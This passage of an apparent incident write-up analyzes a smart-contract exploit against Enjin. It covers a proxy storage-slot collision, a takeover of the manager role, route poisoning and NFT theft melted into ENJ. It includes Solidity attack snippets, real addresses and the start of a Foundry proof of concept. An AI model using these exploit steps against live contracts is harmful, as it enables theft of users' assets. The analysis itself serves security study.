+</span></span><span class="line"><span class="cl">        <span class="n">_ownerOf</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><p>Notice the storage layouts side-by-side during <code>delegatecall</code>:</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>Slot</th>
+            <th><code>NF_TEMPLATE</code> (Proxy)</th>
+            <th><code>ERC721Adapter</code> (Logic)</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>slot 0</code></td>
+            <td><code>_getManager</code></td>
+            <td><em>(unused)</em></td>
+        </tr>
+        <tr>
+            <td><code>slot 1</code></td>
+            <td><code>_acceptManager</code></td>
+            <td><code>_ownerOf</code></td>
+        </tr>
+        <tr>
+            <td><code>slot 2</code></td>
+            <td><code>delegates</code> mapping base (raw value 0)</td>
+            <td><code>_totalSupply</code></td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>When <code>initialize(1)</code> is executed via <code>delegatecall</code> on <code>NF_TEMPLATE</code>:</p>
+<ol>
+<li><code>_totalSupply == 0</code> reads <code>slot 2</code> of <code>NF_TEMPLATE</code>. Since <code>delegates</code> is a mapping, slot 2 itself stores raw zero. The check <code>_totalSupply == 0</code> always passes.</li>
+<li><code>_totalSupply = _poolId</code> writes <code>1</code> into <code>slot 2</code>.</li>
+<li><code>_ownerOf = msg.sender</code> writes <code>msg.sender</code> directly into <code>slot 1</code>.</li>
+<li>In <code>NF_TEMPLATE</code>, <code>slot 1</code> is <code>_acceptManager</code>!</li>
+</ol>
+<p>Anyone calling <code>NF_TEMPLATE.initialize(1)</code> immediately sets <code>_acceptManager = msg.sender</code>. At block 25834070, <code>_acceptManager</code> held <code>0xE5cb0C8E160C5aC4669D1dfD689Df01bA9eea3eB</code> (an in-flight, pending governance transfer). The exploit displaces that pending transfer without any admin intervention.</p>
+<p>The caller then invokes <code>NF_TEMPLATE.acceptManager()</code>. Since <code>msg.sender == _acceptManager</code>, <code>_getManager</code> (slot 0) becomes <code>msg.sender</code>.</p>
+<p>The takeover requires exactly two transactions with zero prior privileges:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// Step 1: overwrite slot 1 (_acceptManager)
+</span></span></span><span class="line"><span class="cl"><span class="n">NF_TEMPLATE</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="mh">0xfe4b84df</span><span class="p">,</span> <span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Step 2: claim manager role
+</span></span></span><span class="line"><span class="cl"><span class="n">IManagedProxy</span><span class="p">(</span><span class="n">NF_TEMPLATE</span><span class="p">).</span><span class="n">acceptManager</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>The exact same storage-slot collision exists symmetrically on the FT template <code>proxy</code> (<code>0x268c039a3127d3107c014f0dc6c390a53e6db27f</code>), which routes <code>initialize(uint256)</code> to <code>0x75512f843d8d22593d7256708ef80a22b97baf5e</code>.</p>
+<h2 class="heading-element" id="3-from-takeover-to-loot-route-poisoning--gateway-abuse"><span>3. From Takeover to Loot: Route Poisoning &amp; Gateway Abuse</span>
+  <a href="#3-from-takeover-to-loot-route-poisoning--gateway-abuse" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Becoming the manager of <code>NF_TEMPLATE</code> does not hold funds directly. The money sits in Adapter (<code>0x4E64...</code>). To convert manager control into ENJ, the attacker chains three mechanisms together.</p>
+<h3 class="heading-element" id="step-1-route-poisoning-via-updatecontract"><span>Step 1: Route Poisoning via <code>updateContract</code></span>
+  <a href="#step-1-route-poisoning-via-updatecontract" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>NF_TEMPLATE</code> routes selector <code>0x61455567</code> (<code>updateContract(address,string,string)</code>) to <code>0x04866013862349a6A19A04C8a1590ea2cF026134</code>. This function allows the manager to bind any function signature to an arbitrary implementation:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// Attacker deploys MaliciousShellLogic
+</span></span></span><span class="line"><span class="cl"><span class="n">MaliciousShellLogic</span> <span class="n">attackerLogic</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MaliciousShellLogic</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Updates NF_TEMPLATE&#39;s delegates mapping
+</span></span></span><span class="line"><span class="cl"><span class="n">NF_TEMPLATE</span><span class="p">.</span><span class="n">updateContract</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">address</span><span class="p">(</span><span class="n">attackerLogic</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;drain(address,address,address,uint256);&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s">&#34;poison&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>Now, any call with <code>drain.selector</code> arriving at <code>NF_TEMPLATE</code> is forwarded via <code>delegatecall</code> to <code>MaliciousShellLogic</code>.</p>
+<h3 class="heading-element" id="step-2-deploying-a-per-item-adapter-shell"><span>Step 2: Deploying a Per-Item Adapter Shell</span>
+  <a href="#step-2-deploying-a-per-item-adapter-shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Enjin allows lazy deployment of lightweight per-item proxy contracts (&ldquo;shells&rdquo;) for any category ID via <code>CryptoItemsAdapters.0x33d332ab</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">PA</span><span class="p">.</span><span class="nb">call</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="mh">0x33d332ab</span><span class="p">,</span> <span class="n">BASE_TYPE_ID</span><span class="p">,</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="kt">uint8</span><span class="p">(</span><span class="mi">0</span><span class="p">)));</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>This deployment is <strong>permissionless</strong>. For NFT item categories (where bit 247 is set), the newly created shell sets its implementation (<code>slot 0</code>) to <code>NF_TEMPLATE</code> and registers <code>ADAPTER.mapping_25[BASE_TYPE_ID] = shell</code>.</p>
+<p>When someone calls the shell with an unknown function selector, the shell&rsquo;s fallback queries <code>NF_TEMPLATE.delegates(selector)</code> and delegatecalls the resulting address.</p>
+<h3 class="heading-element" id="step-3-re-entering-the-transfer-gateway-as-the-shell"><span>Step 3: Re-entering the Transfer Gateway as the Shell</span>
+  <a href="#step-3-re-entering-the-transfer-gateway-as-the-shell" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>The privileged transfer gateway <code>0x41c1df0e</code> inside <code>CryptoItemsAdapters</code> is designed to allow registered adapter shells to move NFT instances:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nf">gateway</span><span class="p">(</span><span class="kt">address</span> <span class="n">operator</span><span class="p">,</span> <span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">id</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">baseType</span> <span class="o">=</span> <span class="n">id</span> <span class="o">&amp;</span> <span class="o">~</span><span class="n">ADDRESS_MASK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">require</span><span class="p">(</span><span class="n">getAdapter</span><span class="p">(</span><span class="n">baseType</span><span class="p">)</span> <span class="o">==</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="s">&#34;Caller not adapter&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Transfers ownership record in Adapter
+</span></span></span><span class="line"><span class="cl">    <span class="n">ADAPTER</span><span class="p">.</span><span class="mh">0x95760fb9</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="k">from</span><span class="p">,</span> <span class="n">to</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>The attacker triggers <code>shell.drain(attacker, victim, attacker, TARGET_INSTANCE_ID)</code>.</p>
+<ol>
+<li>The shell does not recognize <code>drain.selector</code>.</li>
+<li>It looks up <code>NF_TEMPLATE.delegates(drain.selector)</code>, which returns <code>MaliciousShellLogic</code>.</li>
+<li>The shell <code>delegatecalls</code> into <code>MaliciousShellLogic.drain()</code>. Inside this call, <code>address(this)</code> is <code>shell</code>.</li>
+<li><code>MaliciousShellLogic</code> calls <code>PA.0x41c1df0e(attacker, victim, attacker, TARGET_INSTANCE_ID)</code>.</li>
+<li>Since <code>msg.sender</code> is <code>shell</code>, the check <code>getAdapter(baseType) == msg.sender</code> passes.</li>
+<li>The target item has <code>UNBOUND</code> (bit 252) and <code>SKIP_ROYALTY</code> (bit 253) set, skipping royalty fees and bound checks.</li>
+<li>Adapter writes <code>mapping_28[TARGET_INSTANCE_ID] = attacker</code>. The victim&rsquo;s NFT ownership is reassigned to the attacker.</li>
+</ol>
+<h3 class="heading-element" id="step-4-melting-the-stolen-nft-for-enj"><span>Step 4: Melting the Stolen NFT for ENJ</span>
+  <a href="#step-4-melting-the-stolen-nft-for-enj" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>With the NFT instance recorded under the attacker&rsquo;s address, the attacker calls standard <code>melt()</code> on <code>PA</code>:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">ids</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ids</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">TARGET_INSTANCE_ID</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint256</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">amounts</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">uint256</span><span class="p">[](</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">amounts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PA</span><span class="p">.</span><span class="n">melt</span><span class="p">(</span><span class="n">ids</span><span class="p">,</span> <span class="n">amounts</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>The melt execution path (<code>0x1b73f458</code> -&gt; <code>0x553f1e22</code> -&gt; <code>0x9a67aef2</code>):</p>
+<ol>
+<li>Verifies <code>ownerOfRecord(TARGET_INSTANCE_ID) == msg.sender</code>.</li>
+<li>Marks the instance burned by setting owner to <code>0xdeaddeaddeaddeaddeaddeaddeaddead0000</code>.</li>
+<li>Calls <code>Adapter.0x7843e5dd(attacker, meltValue)</code>.</li>
+<li><code>Adapter</code> releases <code>meltValue</code> in real ENJ directly from its reserve to the attacker.</li>
+</ol>
+<p>The theft ceiling is bounded by the real balance of items in the system. Because the underlying Adapter transfer functions enforce balance checks (<code>assert(amount &lt;= balance)</code> / <code>owner == from</code>), the attacker cannot mint balance out of thin air. Instead, they scan for existing high-value items, hijack their ownership, and melt them.</p>
+<h2 class="heading-element" id="4-the-real-incident-6-targets-and-523m-enj"><span>4. The Real Incident: 6 Targets and 5.23M ENJ</span>
+  <a href="#4-the-real-incident-6-targets-and-523m-enj" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>In transaction <code>0xd4a382da03c99ce3084661b913b50b525a4b283f66f510bcf1040152830b2a7e</code>, the attacker executed this sequence systematically across 6 item categories:</p>
+<div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>Target Category ID (Base Type)</th>
+            <th>Melt Value per Unit</th>
+            <th>Units Drained</th>
+            <th>Total ENJ Extracted</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td><code>0x7880000000000a2f...</code></td>
+            <td>3,000,000 ENJ</td>
+            <td>1</td>
+            <td>3,000,000 ENJ</td>
+        </tr>
+        <tr>
+            <td><code>0x7880000000000889...</code></td>
+            <td>1,155,777 ENJ</td>
+            <td>1</td>
+            <td>1,155,777 ENJ</td>
+        </tr>
+        <tr>
+            <td><code>0x788000000000088d...</code></td>
+            <td>512,221 ENJ</td>
+            <td>1</td>
+            <td>512,221 ENJ</td>
+        </tr>
+        <tr>
+            <td><code>0x788000000000088b...</code></td>
+            <td>10,000 ENJ</td>
+            <td>56</td>
+            <td>560,000 ENJ</td>
+        </tr>
+        <tr>
+            <td><code>0x7080000000000305...</code></td>
+            <td>500 ENJ</td>
+            <td>20</td>
+            <td>10,000 ENJ</td>
+        </tr>
+        <tr>
+            <td><code>0x7080000000000780...</code></td>
+            <td>215 ENJ</td>
+            <td>165</td>
+            <td>355 ENJ (partial)</td>
+        </tr>
+        <tr>
+            <td><strong>Total</strong></td>
+            <td></td>
+            <td></td>
+            <td><strong>5,238,353 ENJ</strong></td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>The attacker also took defensive measures in the same transaction:</p>
+<ul>
+<li>Took over both <code>NF_TEMPLATE</code> and the FT <code>proxy</code> symmetrically.</li>
+<li>Poisoned the <code>initialize</code> and <code>acceptManager</code> selectors on both templates to point to an empty contract, effectively locking the proxy to prevent any competing takeover or admin recovery.</li>
+<li>A built-in creator royalty fee caused 7,000 ENJ to be paid to creator address <code>0x862E4dc54EceaADa8a2574E0d5D5d730F692466f</code>, leaving 5,231,353 ENJ collected by the attacker EOA (<code>0x5ec1BA7892D11059c39557b762a97DD695778Ca5</code>).</li>
+</ul>
+<h2 class="heading-element" id="5-reproduction"><span>5. Reproduction</span>
+  <a href="#5-reproduction" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>The following Foundry PoC reproduces the exploit on a mainnet fork at block 25834070 against the single highest-value target (melt value: 3,000,000 ENJ).</p>
+<h3 class="heading-element" id="maliciousshelllogicsol"><span><code>MaliciousShellLogic.sol</code></span>
+  <a href="#maliciousshelllogicsol" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">23</span><span class="p">;</span>
